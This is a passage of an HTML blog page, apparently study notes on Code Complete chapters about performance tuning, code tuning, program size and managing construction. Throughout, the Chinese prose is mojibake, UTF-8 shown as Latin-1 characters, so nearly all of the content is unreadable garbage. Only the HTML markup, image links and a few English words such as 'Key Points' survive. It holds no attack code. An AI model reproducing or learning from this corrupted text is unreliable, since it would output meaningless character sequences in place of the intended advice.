æ“ä½œã€‚</li><li>å†…å­˜åˆ†é¡µã€‚å¼•å‘æ“ä½œç³»ç»Ÿäº¤æ¢å†…å­˜é¡µé¢çš„è¿ç®—ä¼šæ¯”åœ¨å†…å­˜åŒä¸€é¡µä¸­è¿›è¡Œçš„è¿ç®—æ…¢å¾ˆå¤šã€‚</li><li>ç³»ç»Ÿè°ƒç”¨ã€‚è°ƒç”¨ç³»ç»Ÿå­ç¨‹åºçš„ä»£ä»·å¸¸å¸¸æ˜¯ååˆ†å¯è§‚çš„ã€‚è¿™äº›è°ƒç”¨é€šå¸¸ä¼šæ¶‰åŠç³»ç»Ÿçš„ä¸Šä¸‹æ–‡åˆ‡æ¢â€”â€”ä¿å­˜ç¨‹åºçŠ¶æ€ã€æ¢å¤å†…æ ¸çŠ¶æ€ï¼Œä»¥åŠç›¸åçš„æ“ä½œã€‚</li><li>è§£é‡Šå‹è¯­è¨€</li><li>é”™è¯¯ã€‚è¿™äº›é”™è¯¯å¯èƒ½æ˜¯æ²¡æœ‰å»æ‰è°ƒè¯•ä»£ç ã€å¿˜è®°é‡Šæ”¾å†…å­˜ã€æ•°æ®è¡¨åº“è®¾è®¡å¤±è¯¯ã€è½®è¯¢å¹¶ä¸å­˜åœ¨çš„è®¾å¤‡ç›´åˆ°è¶…æ—¶ç­‰</li></ul><p>å°½ç®¡å‡ ä¹ä¸å¯èƒ½ä»ä¸€ç§æ–¹æ³•ä¸­è·å¾—åå€çš„æ€§èƒ½æ”¹è¿›ï¼Œä½†ä½ å¯ä»¥å°†å¤šç§æ–¹æ³•æœ‰æ•ˆåœ°ç»“åˆèµ·æ¥ï¼Œæ•ˆæœç»å¸¸æ˜¯æƒŠäººçš„ã€‚</p><h3 id="ç¨‹åºæ•´ä½“æ€§èƒ½æå‡çš„æ–¹æ³•"><a href="#ç¨‹åºæ•´ä½“æ€§èƒ½æå‡çš„æ–¹æ³•" class="headerlink" title="ç¨‹åºæ•´ä½“æ€§èƒ½æå‡çš„æ–¹æ³•"></a>ç¨‹åºæ•´ä½“æ€§èƒ½æå‡çš„æ–¹æ³•</h3><ul><li>ä¿®æ”¹éœ€æ±‚</li><li>ä¿®æ”¹ç¨‹åºè®¾è®¡</li><li>ä¿®æ”¹ç±»çš„è®¾è®¡</li><li>å‡å°‘ç¨‹åºä¸æ“ä½œç³»ç»Ÿçš„äº¤äº’</li><li>é¿å…å†—ä½™ I/O æ“ä½œ</li><li>ä½¿ç”¨ç¼–è¯‘å‹è¯­è¨€æ›¿æ¢è§£é‡Šå‹è¯­è¨€</li><li>ä½¿ç”¨æ›´å¥½çš„ç¼–è¯‘å™¨ä¼˜åŒ–</li><li>ä½¿ç”¨ä¸åŒç¡¬ä»¶æå‡æ€§èƒ½</li><li>æ˜¯å¦å°†ä»£ç è°ƒæ•´çœ‹åšæ€§èƒ½ä¼˜åŒ–çš„æœ€åä¸€æ‹›ï¼Ÿ</li></ul><p>Key Points</p><ul><li>æ€§èƒ½åªæ˜¯è½¯ä»¶æ•´ä½“è´¨é‡çš„ä¸€ä¸ªæ–¹é¢ï¼Œé€šå¸¸ä¸æ˜¯æœ€é‡è¦çš„ã€‚ç›¸å¯¹äºä»£ç æœ¬èº«çš„æ•ˆç‡è€Œè¨€ï¼Œç¨‹åºçš„æ¶æ„ã€ç»†èŠ‚è®¾è®¡ä»¥åŠæ•°æ®ç»“æ„å’Œç®—æ³•é€‰æ‹©å¯¹ç¨‹åºçš„è¿è¡Œé€Ÿåº¦å’Œèµ„æºå ç”¨çš„å½±å“é€šå¸¸ä¼šæ›´å¤§ã€‚</li><li>å®šé‡æµ‹é‡æ˜¯å®ç°æ€§èƒ½æœ€ä¼˜åŒ–çš„å…³é”®ã€‚å®šé‡æµ‹é‡éœ€è¦æ‰¾å‡ºèƒ½çœŸæ­£å†³å®šç¨‹åºæ€§èƒ½çš„éƒ¨åˆ†ï¼Œåœ¨ä¿®æ”¹ä¹‹å,åº”å½“é€šè¿‡é‡å¤æµ‹é‡æ¥æ˜ç¡®ä¿®æ”¹æ˜¯æé«˜è¿˜æ˜¯é™ä½äº†è½¯ä»¶çš„æ€§èƒ½ã€‚</li><li><strong>ç»å¤§å¤šæ•°çš„ç¨‹åºéƒ½æœ‰é‚£ä¹ˆä¸€å°éƒ¨åˆ†ä»£ç è€—è´¹äº†ç»å¤§éƒ¨åˆ†çš„è¿è¡Œæ—¶é—´</strong>ã€‚å¦‚æœæ²¡æœ‰æµ‹é‡ï¼Œä½ ä¸ä¼šçŸ¥é“æ˜¯å“ªä¸€éƒ¨åˆ†ä»£ç ã€‚</li><li>ä»£ç è°ƒæ•´éœ€è¦åå¤å°è¯•ï¼Œè¿™æ ·æ‰èƒ½è·å¾—ç†æƒ³çš„æ€§èƒ½æé«˜ã€‚</li><li>ä¸ºæ€§èƒ½ä¼˜åŒ–å·¥ä½œåšå¥½å‡†å¤‡çš„æœ€ä½³æ–¹å¼å°±æ˜¯åœ¨æœ€åˆé˜¶æ®µç¼–å†™æ¸…æ™°çš„ä»£ç ,ä»è€Œä½¿ä»£ç åœ¨åç»­å·¥ä½œä¸­æ˜“äºç†è§£å’Œä¿®æ”¹ã€‚</li></ul><h2 id="ç¬¬26ç« -ä»£ç è°ƒæ•´æŠ€æœ¯"><a href="#ç¬¬26ç« -ä»£ç è°ƒæ•´æŠ€æœ¯" class="headerlink" title="ç¬¬26ç«  ä»£ç è°ƒæ•´æŠ€æœ¯"></a>ç¬¬26ç«  ä»£ç è°ƒæ•´æŠ€æœ¯</h2><p>ä¼˜åŒ–å¾ªç¯çš„å‡ ä¸ªæ–¹é¢</p><ul><li><strong>ç¼–å†™é«˜æ•ˆå¾ªç¯çš„å…³é”®åœ¨äºå°½å¯èƒ½å‡å°‘å¾ªç¯å†…éƒ¨æ‰€åšçš„å·¥ä½œ</strong>ã€‚å¦‚æœä½ å¯ä»¥åœ¨å¾ªç¯å¤–é¢è®¡ç®—æŸè¯­å¥æˆ–æŸéƒ¨åˆ†è¯­å¥ï¼Œè€Œåœ¨å¾ªç¯å†…éƒ¨åªæ˜¯ä½¿ç”¨è®¡ç®—ç»“æœï¼Œé‚£ä¹ˆå°±æŠŠå®ƒä»¬æ”¾åˆ°å¤–é¢ã€‚è¿™æ˜¯ä¸€ç§å¾ˆå¥½çš„ç¼–ç¨‹å®è·µï¼Œåœ¨å¾ˆå¤šæƒ…å†µä¸‹è¿˜å¯ä»¥æ”¹å–„ç¨‹åºçš„å¯è¯»æ€§ã€‚</li><li>æŠŠå¾ªç¯æ¬¡æ•°æœ€å¤šçš„å¾ªç¯æ”¾åœ¨æœ€å†…å±‚</li><li>ç”¨æ›´é«˜æ•ˆçš„æ–¹å¼è¿ç®—ï¼Œå¦‚ç”¨ç§»ä½ä»£æ›¿ä¹˜é™¤ï¼Œå°†é‡‘é¢ä»¥åˆ†ä¸ºå•ä½è¿›è¡Œæ•´å‹è¿ç®—ï¼Œè€Œéæµ®ç‚¹æ•°</li><li>æ•°ç»„ç»´åº¦å°½å¯èƒ½æµ…</li><li>åˆ©ç”¨ä»£æ•°çš„æ’ç­‰æ›¿æ¢ã€‚å¦‚ç”¨<code>x&lt;y</code>åˆ¤æ–­æ›¿æ¢<code>sqrt(x)&lt;sqrt(y)</code></li><li>å°½å¯èƒ½å°†è¿è¡Œå‰å°±å¯ç¡®å®šçš„å€¼ç¡®å®šä¸‹æ¥ï¼Œä»¥åŠ å¿«è¿ç®—é€Ÿåº¦ã€‚å¦‚ä¸€å¤©çš„ç§’æ•°å›ºå®šä¸º 86400sï¼Œæ— éœ€æ¯æ¬¡è¿è¡Œæ—¶è®¡ç®—ã€‚</li></ul><h2 id="ç¬¬27ç« -ç¨‹åºè§„æ¨¡å¯¹æ„å»ºçš„å½±å“"><a href="#ç¬¬27ç« -ç¨‹åºè§„æ¨¡å¯¹æ„å»ºçš„å½±å“" class="headerlink" title="ç¬¬27ç«  ç¨‹åºè§„æ¨¡å¯¹æ„å»ºçš„å½±å“"></a>ç¬¬27ç«  ç¨‹åºè§„æ¨¡å¯¹æ„å»ºçš„å½±å“</h2><p>å¦‚æœä½ ä¹ æƒ¯äºå¼€å‘å°é¡¹ç›®ï¼Œé‚£ä¹ˆä½ çš„ç¬¬ä¸€ä¸ªä¸­å¤§å‹é¡¹ç›®æœ‰å¯èƒ½ä¸¥é‡å¤±æ§ï¼Œå®ƒä¸ä¼šåƒä½ æ†§æ†¬é‚£æ ·æˆåŠŸï¼Œè€Œä¼šå˜æˆä¸€å¤´æ— æ³•æ§åˆ¶çš„é‡å…½ã€‚å¦‚æœä½ å·²ç»ä¹ æƒ¯äºå¼€å‘å¤§å‹é¡¹ç›®ï¼Œé‚£ä¹ˆä½ æ‰€ç”¨çš„æ–¹æ³•å¯èƒ½å¯¹å°é¡¹ç›®æ¥è¯´å¤ªæ­£è§„äº†ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872w9izp2j314k0t2wjr.jpg" alt=""></p><p><strong>é¡¹ç›®è¶Šå¤§è¶Šå®¹æ˜“å‡ºé”™</strong>ã€‚è¿™åŒ…å«æˆå‘˜é—´å¤æ‚çš„æ²Ÿé€šã€éœ€æ±‚è¯„ä¼°çš„å‡†ç¡®æ€§ã€æ¶æ„è®¾è®¡çš„åˆç†æ€§ã€ç»„ç»‡ç»“æ„ã€ç”Ÿäº§æ•ˆç‡ä»¥åŠé”™è¯¯ç‡ç­‰ï¼Œä½ éœ€è¦æ¯”å°å‹é¡¹ç›®èŠ±è´¹æ›´å¤šçš„ç²¾åŠ›æ‰èƒ½è·å¾—ä¸å°å‹é¡¹ç›®ä¸€æ ·çš„é”™è¯¯ç‡ã€‚</p><p>åœ¨è½¯ä»¶å¼€å‘ä¸­ï¼Œäººè¶Šå¤šï¼Œæ•ˆç‡å°±è¶Šä½ï¼åˆé€‚çš„äººï¼Œåˆé€‚çš„é…ç½®æ‰èƒ½æé«˜æ•ˆç‡ã€‚é«˜æ•ˆçš„å¤§å‹é¡¹ç›®æ˜¯å»ºç«‹ä¸€ä¸ªåˆ†å·¥æ˜ç¡®ã€åˆä½œæœ‰åºçš„ã€Œå¤–ç§‘æ‰‹æœ¯å¼çš„é˜Ÿä¼ã€ã€‚å¤–ç§‘æ‰‹æœ¯ä¸­ï¼Œæœ‰ä¸»åˆ€åŒ»ç”Ÿã€ç¬¬ä¸€åŠ©æ‰‹ã€éº»é†‰åŒ»ç”Ÿã€æŠ¤å£«ç­‰ï¼Œè½¯ä»¶é¡¹ç›®ä¹Ÿåº”è¯¥æœ‰é¦–å¸­ç¨‹åºå‘˜ã€å…¶ä»–çš„ç¨‹åºå‘˜ã€ç®¡ç†è€…ï¼Œæ–‡æ¡£ç¼–è¾‘äººå‘˜ç­‰ã€‚è¿™æ ·ï¼Œæ—¢èƒ½è·å¾—ç”±å°‘æ•°å¤´è„‘äº§ç”Ÿçš„äº§å“å®Œæ•´æ€§ï¼Œåˆèƒ½å¾—åˆ°å¤šä½ååŠ©äººå‘˜çš„æ€»ä½“ç”Ÿäº§ç‡ï¼Œè¿˜å½»åº•åœ°å‡å°‘äº†æ²Ÿé€šçš„å·¥ä½œé‡ã€‚</p><blockquote><p>å…³äºå¤§å‹é¡¹ç›®ç®¡ç†è¯·å‚çœ‹ã€Šäººæœˆç¥è¯ã€‹<br>ä¸€ç‚¹æƒ³æ³•ï¼šå¦‚ä½•è¯„ä¼°ç¼–ç¨‹ç®¡ç†æ˜¯å¦åˆç†ï¼ŸæŸ¥çœ‹ç¨‹åºå‘˜çš„æ¯å¤©é«˜è´¨é‡çš„ä»£ç è¡Œæ•°ä»¥åŠ bug ç‡ã€‚</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872wpk2uhj30yc0h0act.jpg" alt=""></p><h2 id="ç¬¬28ç« -ç®¡ç†æ„å»º"><a href="#ç¬¬28ç« -ç®¡ç†æ„å»º" class="headerlink" title="ç¬¬28ç«  ç®¡ç†æ„å»º"></a>ç¬¬28ç«  ç®¡ç†æ„å»º</h2><p><strong>ç”±ä¸€ä½å—äººå°Šæ•¬çš„æ¶æ„å¸ˆæ¥åˆ¶å®šæ ‡å‡†</strong>ã€‚æœ‰æ—¶é¡¹ç›®çš„æ¶æ„å¸ˆåªæ˜¯ä¸€ååœ¨é¡¹ç›®ä¸­å¾…çš„æ—¶é—´éå¸¸é•¿çš„èµ„æ·±é—²æ‚äººå£«ï¼Œä»–å·²ç»ä¸å†æ¥è§¦ä¸äº§å“ç¼–ç æœ‰å…³çš„äº‹åŠ¡äº†ã€‚ç”±è¿™ç§â€œæ¶æ„å¸ˆâ€å®šä¹‰å‡ºæ¥çš„æ ‡å‡†æ˜¯ä¼šå—åˆ°ç¨‹åºå‘˜æ€¨æ¨çš„ï¼Œå› ä¸ºä»–æ ¹æœ¬ä¸äº†è§£ç¨‹åºå‘˜æ­£åœ¨åšçš„å·¥ä½œã€‚</p><h3 id="é¼“åŠ±è‰¯å¥½çš„ç¼–ç å®è·µæŠ€æœ¯"><a href="#é¼“åŠ±è‰¯å¥½çš„ç¼–ç å®è·µæŠ€æœ¯" class="headerlink" title="é¼“åŠ±è‰¯å¥½çš„ç¼–ç å®è·µæŠ€æœ¯"></a>é¼“åŠ±è‰¯å¥½çš„ç¼–ç å®è·µæŠ€æœ¯</h3><ul><li>ç»™é¡¹ç›®çš„æ¯ä¸€éƒ¨åˆ†åˆ†æ´¾ä¸¤ä¸ªäººã€‚å¦‚æœæ¯è¡Œä»£ç éƒ½ç”±ä¸¤ä¸ªäººå…±åŒå®Œæˆï¼Œé‚£ä¹ˆä½ å¯ä»¥ä¿è¯è‡³å°‘æœ‰ä¸¤ä¸ªäººè®¤ä¸ºè¿™æ®µä»£ç æ˜¯èƒ½å·¥ä½œçš„ï¼Œè€Œä¸”æ˜¯å¯è¯»çš„ã€‚ä¸¤äººç»„é˜Ÿçš„åŠæ³•æœ‰ç»“å¯¹ç¼–ç¨‹ã€å¯¼å¸ˆå¸¦å­¦ç”Ÿã€å¤å®¡ç­‰ã€‚</li><li>é€è¡Œå¤æŸ¥ä»£ç ã€‚é™¤äº†èƒ½ä¸ºâ€œåŸç¨‹åºå‘˜ç¦»å¼€é¡¹ç›®â€è¿™ä¸€æƒ…å†µæä¾›ä¸€å±‚å®‰å…¨ä¿éšœå¤–ï¼Œå¤æŸ¥è¿˜èƒ½æ”¹å–„ä»£ç çš„è´¨é‡ï¼Œå› ä¸ºç¨‹åºå‘˜çŸ¥é“ä¼šæœ‰å…¶ä»–äººé˜…è¯»ä»–çš„ä»£ç ã€‚</li><li>è¦æ±‚ä»£ç ç­¾åã€‚åœ¨è®¤å®šä»£ç å®Œæˆä¹‹å‰ï¼Œé«˜çº§æŠ€æœ¯äººå‘˜å¿…é¡»åœ¨ä»£ç æ¸…å•ä¸Šç­¾å­—ã€‚</li><li>å®‰æ’ä¸€äº›å¥½çš„ä»£ç ç¤ºä¾‹ä¾›äººå‚è€ƒã€‚ä½ å¯ä»¥ç”¨ä¸€ä»½æ¸…æ¥šçš„æ ·ä¾‹è¯´æ˜è‡ªå·±çš„è´¨é‡ç›®æ ‡ã€‚ç±»ä¼¼çš„ï¼Œç¼–ç æ ‡å‡†æ‰‹å†Œé‡Œä¹Ÿå¯ä»¥ä¸»è¦åŒ…å«ä¸€ä»½â€œæœ€ä½³ä»£ç æ¸…å•â€ã€‚è¿™ç§æ‰‹å†Œæ›´æ–°èµ·æ¥è¦æ¯”æ–‡æ¡£å®¹æ˜“çš„å¤šï¼Œè€Œä¸”å®ƒèƒ½å¾ˆå®¹æ˜“åœ°å°†ç¼–ç é£æ ¼ä¸­çš„ç»†å¾®ä¹‹å¤„è¡¨è¾¾æ¸…æ¥šã€‚</li><li>å¼ºè°ƒä»£ç æ˜¯å…¬æœ‰è´¢äº§ã€‚è¿™ä¼šè®©å¼€å‘è€…æœ‰æ„è¯†çš„æ³¨æ„è‡ªå·±çš„ä»£ç è´¨é‡ã€‚</li><li>å¥–åŠ±å¥½ä»£ç ã€‚åœ¨å¼€å‘ä½ çš„æ¿€åŠ±æœºåˆ¶æ—¶ï¼Œè¯·å°†ä»¥ä¸‹æ–¹é¢è€ƒè™‘è¿›å»ï¼š<ul><li>æ‰€ç»™äºˆçš„å¥–åŠ±åº”è¯¥æ˜¯ç¨‹åºå‘˜æƒ³è¦çš„</li><li><strong>åªæœ‰éå¸¸å‡ºè‰²çš„ä»£ç æ‰åº”å¾—åˆ°å¥–åŠ±</strong>ã€‚è‡³äºè¿™ä½ç¨‹åºå‘˜æ˜¯å¦æœ‰è‰¯å¥½çš„åˆä½œæ€åº¦æˆ–è€…ä¸Šç­æ˜¯å¦å‡†æ—¶éƒ½ä¸é‡è¦ï¼Œ<strong>å¦‚æœä½ çš„å¥–åŠ±ä¸ç¬¦åˆæŠ€æœ¯æ ‡å‡†ï¼Œä½ å°†å¤±å»ä¿¡èª‰</strong>ã€‚å¦‚æœä½ çš„æŠ€æœ¯æ°´å¹³è¿˜æ²¡æœ‰é«˜åˆ°è¶³ä»¥åˆ¤æ–­ä»£ç çš„ä¼˜åŠ£ï¼Œé‚£ä¹ˆå°±ä¸è¦åˆ¤æ–­ï¼è¿™æ—¶å€™åƒä¸‡ä¸è¦å¥–åŠ±ï¼Œæˆ–è€…è®©ä½ çš„å›¢é˜Ÿæ¥é€‰æ‹©è¯¥å¥–åŠ±è°ã€‚</li><li>å°†å¥–åŠ±è®¾ç½®ä¸ºæ¯æœˆä¸€æ¬¡ï¼Œè¿™æ ·<strong>å¼€å‘è€…çš„åŠªåŠ›å›æŠ¥ä¸ä¼šå› ä¸ºå¤ªä¹…è€Œæ”¾å¼ƒ</strong>ï¼Œä¿ƒä½¿å¤§å®¶éƒ½åœ¨åŠªåŠ›æå‡è‡ªå·±ã€‚</li></ul></li><li>ä¸€ä»½ç®€å•çš„æ ‡å‡†ã€‚å¦‚æœä½ æ­£åœ¨ç®¡ç†ä¸€ä¸ªç¼–ç¨‹é¡¹ç›®ï¼Œå¹¶ä¸”ä½ å…·æœ‰ä¸€å®šçš„ç¼–ç¨‹èƒŒæ™¯ï¼Œé‚£ä¹ˆæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥ç®€å•æœ‰æ•ˆåœ°è·å¾—å¥½çš„å·¥ä½œæˆæœâ€”â€”ä½ åªéœ€è¦æ±‚â€œ<strong>æˆ‘å¿…é¡»èƒ½é˜…è¯»å¹¶ç†è§£è¿™ä¸ªé¡¹ç›®é‡Œçš„æ‰€æœ‰ä»£ç </strong>â€ã€‚ç®¡ç†è€…ä¸æ˜¯æŠ€æœ¯ä¸“å®¶è¿™ä¸€äº‹å®åè€Œæœ‰åŠ©äºé˜»æ­¢äº§ç”Ÿâ€œèªæ˜çš„â€æˆ–è€…éš¾ä»¥ç†è§£çš„ä»£ç ã€‚</li></ul><blockquote><p>å°æ€è€ƒï¼šä¸ºä»€ä¹ˆä¼˜ç§€çš„å¼€æºç¨‹åºçš„è´¨é‡å¾ˆé«˜ï¼Ÿ<br>è´¡çŒ®è€…åœ¨å¼€æºå‰ä¼šä¼˜åŒ–ä»£ç çš„å¯è¯»æ€§ï¼Œæµ‹è¯•è‡ªå·±çš„ä»£ç è´¨é‡ï¼Œå¼€æºåä¼šæœ‰å…¶ä»–å¼€å‘è€…ä¸€åŒå®¡è§†ã€è¿è¡Œä»£ç ã€åé¦ˆé—®é¢˜ï¼Œä»è€Œå¾—åˆ°æ­£å‘å¾ªç¯çš„ä¼˜åŒ–ã€‚</p></blockquote><p>æ§åˆ¶è®¾è®¡å˜æ›´çš„æŒ‡å¯¼åŸåˆ™</p><ul><li>éµå¾ªæŸç§ç³»ç»ŸåŒ–çš„å˜æ›´æ§åˆ¶æ‰‹ç»­</li><li>æˆç»„åœ°å¤„ç†å˜æ›´è¯·æ±‚ã€‚å½“ä½ åœ¨å¼€å‘ä¸­æœ‰å˜æ›´æƒ³æ³•æ—¶ï¼Œè¯·å°†å®ƒè®°å½•ä¸‹æ¥ï¼Œé›†ä¸­æ³¨æ„åœ¨å¼€å‘å·¥ä½œä¸­ï¼Œåœ¨å¼€å‘ç»“æŸåç»Ÿä¸€å¤„ç†è¿™äº›å˜æ›´ã€‚è¿™é¿å…ä½ çš„å¼€å‘å·¥ä½œè¢«æ‰“æ–­ã€ä¸å¿…è¦çš„å˜æ›´ï¼Œä»¥åŠé”™è¿‡ä¸€äº›å¥½çš„å˜æ›´ã€‚</li><li>è¯„ä¼°æ¯é¡¹å˜æ›´çš„æˆæœ¬ã€‚å˜æ›´æ§åˆ¶çš„å®è´¨æ˜¯ç¡®å®šä»€ä¹ˆæœ€é‡è¦ï¼Œæ‰€ä»¥è¦ç¡®å®šå˜æ›´çš„æ”¶ç›Šä¸æˆæœ¬æ˜¯åˆ’ç®—çš„ã€‚</li><li>æé˜²å¤§é‡çš„å˜æ›´è¯·æ±‚ã€‚å°½ç®¡å˜æ›´åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ˜¯ä¸å¯é¿å…çš„ï¼Œ<strong>å˜æ›´è¯·æ±‚çš„æ•°é‡å¤ªå¤§ä»ç„¶æ˜¯ä¸€ä¸ªå¾ˆå…³é”®çš„è­¦æŠ¥ä¿¡å·ï¼Œå®ƒè¡¨æ˜éœ€æ±‚ã€æ¶æ„æˆ–è€…ä¸Šå±‚è®¾è®¡åšå¾—ä¸å¤Ÿå¥½ï¼Œä»è€Œæ— æ³•æœ‰æ•ˆåœ°æ”¯æŒæ„å»ºæ´»åŠ¨</strong>ã€‚å¯¹éœ€æ±‚æˆ–è€…æ¶æ„è¿›è¡Œè¿”å·¥ä¹Ÿè®¸çœ‹ä¸Šå»ä»£ä»·æ˜‚è´µï¼Œä½†æ˜¯ä¸â€œå¤šæ¬¡æ„å»ºè½¯ä»¶â€æˆ–è€…â€œæ‰”æ‰ä¸éœ€è¦çš„åŠŸèƒ½çš„ä»£ç â€çš„é«˜æ˜‚ä»£ä»·ç›¸æ¯”,è¿˜æ˜¯å€¼å¾—è€ƒè™‘çš„ã€‚</li><li>æˆç«‹å˜æ›´æ§åˆ¶å§”å‘˜ä¼šæˆ–è€…ç±»ä¼¼æœºæ„</li><li>è­¦æƒ•å®˜åƒšä¸»ä¹‰ï¼Œä½†ä¹Ÿä¸è¦å› ä¸ºå®³æ€•å®˜åƒšä¸»ä¹‰è€Œæ’æ–¥æœ‰æ•ˆçš„å˜æ›´æ§åˆ¶</li></ul><h3 id="è½¯ä»¶è¯„ä¼°çš„æ–¹æ³•"><a href="#è½¯ä»¶è¯„ä¼°çš„æ–¹æ³•" class="headerlink" title="è½¯ä»¶è¯„ä¼°çš„æ–¹æ³•"></a>è½¯ä»¶è¯„ä¼°çš„æ–¹æ³•</h3><ul><li>å»ºç«‹ç›®æ ‡ã€‚è¯„ä¼°ä¸­æ˜¯å¦åŒ…å«ä¼šè®®ã€ä¼‘å‡ã€èŠ‚å‡æ—¥ã€åŸ¹è®­ä»¥åŠå…¶ä»–éé¡¹ç›®ç›¸å…³çš„æ´»åŠ¨ï¼Ÿä»€ä¹ˆæ ·çš„è¯„ä¼°å‡†ç¡®åº¦æ‰èƒ½è¾¾åˆ°ä½ çš„ç›®æ ‡ï¼Ÿä¹è§‚è¯„ä¼°ä¸æ‚²è§‚è¯„ä¼°ä¼šäº§ç”Ÿæˆªç„¶ä¸åŒçš„ç»“æœå—ï¼Ÿ</li><li>ä¸ºè¯„ä¼°ç•™å‡ºæ—¶é—´ï¼Œå¹¶ä½œå‡ºè®¡åˆ’</li><li>æ¸…æ¥šåœ°è¯´æ˜è½¯ä»¶éœ€æ±‚ã€‚å½“è¦åšçš„äº‹æƒ…è¿˜æ²¡æœ‰ç¡®å®šæ—¶ï¼Œè°ä¹Ÿæ— æ³•åšå‡ºå‡†ç¡®çš„è¯„ä¼°ã€‚</li><li>åœ¨åº•å±‚ç»†èŠ‚å±‚é¢è¿›è¡Œè¯„ä¼°</li><li>ä½¿ç”¨è‹¥å¹²ä¸åŒçš„è¯„ä¼°æ–¹æ³•ï¼Œå¹¶ä¸”æ¯”è¾ƒå…¶ç»“æœã€‚å°å­©ä»¬å¾ˆæ—©å°±çŸ¥é“ï¼Œå¦‚æœåˆ†åˆ«å‘çˆ¶æ¯ç´¢è¦å†°æ¿€å‡Œï¼Œæ¯”ä»…å‘çˆ¶äº²æˆ–æ¯äº²ç´¢è¦çš„æˆåŠŸç‡è¦é«˜ï¼Œè€Œä¸”å¯èƒ½è¦åˆ°ä¸¤ä»½ã€‚</li><li>å®šæœŸåšé‡æ–°è¯„ä¼°ã€‚é¡¹ç›®è¶Šæ¥è¿‘å®Œæˆï¼Œè¯„ä¼°çš„å‡†ç¡®åº¦åº”è¯¥è¶Šé«˜ã€‚è¦ä¸æ—¶åœ°å°†è¯„ä¼°ç»“æœå’Œå®é™…ç»“æœè¿›è¡Œæ¯”ä»·è¡¡é‡ï¼Œç”¨è¿™ä¸€è¡¡é‡ç»“æœæ¥æ”¹å–„ä½ å¯¹é¡¹ç›®å‰©ä½™éƒ¨åˆ†çš„è¯„ä¼°ã€‚</li></ul><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872uxkjruj31680u00yo.jpg" alt=""></p><p>ä¸€ä½å¦‡å¥³æ€€èƒåæœˆè¯ä¸‹ä¸€å­ï¼Œå¹¶ä¸æ„å‘³ç€åä½å¦‡å¥³èƒ½åªç”¨ä¸€ä¸ªæœˆæ—¶é—´ç”Ÿä¸‹ä¸€ä¸ªå­©å­ã€‚å› æ­¤ï¼Œå¯¹äºæŸäº›æ— æ³•æ‹†åˆ†çš„ä»»åŠ¡ï¼Œåœ¨è½åæ—¶æ·»åŠ äººæ‰‹åªä¼šè®©é¡¹ç›®å»¶æœŸæ›´ä¹…ï¼Œå› ä¸ºæ–°æ‰‹éœ€è¦å…ˆç†Ÿæ‚‰é¡¹ç›®æ‰èƒ½äº§å‡ºï¼Œè€Œç†Ÿæ‚‰é¡¹ç›®åˆå ç”¨äº†å·²å—è®­çš„å¼€å‘è€…æ—¶é—´ã€‚ä»…ä»…å¢åŠ äººå‘˜è¿˜ä¼šå¯¼è‡´äº¤æµçš„å¤æ‚åº¦å’Œæ•°æ®ä¹Ÿå¢åŠ ã€‚æ­¤æ—¶ï¼Œå¦‚æœå¯ä»¥å»¶é•¿å¼€å‘æ—¶é—´å½“ç„¶æ˜¯æœ€å¥½çš„ï¼Œå¦‚æœä¸èƒ½ï¼Œé‚£å°±ä¿ç•™å¿…é¡»çš„åŠŸèƒ½ï¼Œæˆ–è€…åŸæœ‰åŠŸèƒ½çš„ç®€åŒ–ç‰ˆæœ¬ã€‚</p><h3 id="å·¥ä½œç¯å¢ƒä¸ç”Ÿäº§æ•ˆç‡çš„å…³ç³»"><a href="#å·¥ä½œç¯å¢ƒä¸ç”Ÿäº§æ•ˆç‡çš„å…³ç³»" class="headerlink" title="å·¥ä½œç¯å¢ƒä¸ç”Ÿäº§æ•ˆç‡çš„å…³ç³»"></a>å·¥ä½œç¯å¢ƒä¸ç”Ÿäº§æ•ˆç‡çš„å…³ç³»</h3><p>ç”Ÿäº§åŠ›ä¸å·¥ä½œç¯å¢ƒé—´æœ‰ç€å¾ˆå¼ºçš„å…³è”æ€§ã€‚å¦‚æœå¼€å‘è€…æ—è¾¹åç€ç”µè¯é”€å”®æˆ–è€…å”®åï¼Œä»–ä»¬æ˜¯æ— è®ºå¦‚ä½•éƒ½æ— æ³•äº§å‡ºé«˜è´¨é‡ä»£ç çš„ã€‚</p><blockquote><p>ç®¡ç†è€…åº”è¯¥å…³æ³¨æå‡å‘˜å·¥çš„æœ‰æ•ˆç”Ÿäº§åŠ›ã€‚å¦‚æœèƒ½é€šè¿‡ä¸€æ¬¡æŠ•å…¥çš„æ”¹å–„ç¯å¢ƒæ¥æŒç»­æå‡ç”Ÿäº§åŠ›ï¼Œä½•ä¹è€Œä¸ä¸ºå‘¢ï¼Ÿæ¯”å¦‚é’ˆå¯¹å¼€å‘è€…è®¾ç½®æ ¼å­é—´åŠå…¬ï¼Œè‡ªç”±çš„å·¥ä½œæ—¶é—´ï¼Œæ¯å‘¨å…è®¸å‘˜å·¥ä¸¤å¤©è¿œç¨‹åŠå…¬ç­‰ã€‚åªè¦å‘˜å·¥èƒ½å¤ŸæŒ‰æ—¶é«˜è´¨é‡å®Œæˆå·¥ä½œï¼Œæˆ‘è§‰å¾—å·¥ä½œå½¢å¼ä¸å¿…æ‹˜æ³¥ã€‚</p></blockquote><blockquote><p>å…³äºè¿œç¨‹åŠå…¬ä¸åŠå…¬å®¤åŠå…¬çš„ä¸€äº›è®¨è®ºï¼šè¿œç¨‹åŠå…¬æœ‰ä¼˜åŠ¿æœ‰åŠ£åŠ¿ï¼Œå¯¹äºç‹¬ç«‹æ€§å¼ºçš„å·¥ä½œã€æˆ–è€…ä¸ªäººèƒ½åŠ›è¶…å¼ºçš„äººï¼Œè¿™æ¯”è¾ƒåˆé€‚ï¼›ä½†æ˜¯å¯¹äºååŒéå¸¸é¢‘ç¹ã€æˆ–è€…éœ€è¦å¤§é‡ç»„ç»‡ç®¡ç†å·¥ä½œçš„äººæ¥è¯´ï¼Œè¿™åªä¼šé™ä½ç”Ÿäº§åŠ›ã€‚å¦‚æœæ¯å‘¨å…è®¸å‡ 